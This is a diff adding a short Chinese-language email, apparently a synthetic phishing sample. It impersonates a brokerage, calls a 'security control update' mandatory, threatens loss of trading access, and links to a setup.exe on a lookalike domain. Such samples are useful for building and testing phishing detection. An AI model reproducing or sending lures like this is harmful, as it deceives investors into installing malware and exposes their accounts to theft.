@@ -1,0 +1,10 @@
+From: =?utf-8?B?5Lqk5piT5pyN5Yqh?= <jy@broker-client21.example>
+To: investor@personal.example
+Date: Wed, 23 Sep 2026 09:15:00 +0800
+Message-ID: <0005-b30@synth.example>
+Subject: 交易客户端安全控件更新（必装）
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+
+不更新将无法登录交易。
+控件包：https://jy-kj21.example.info/setup.exe
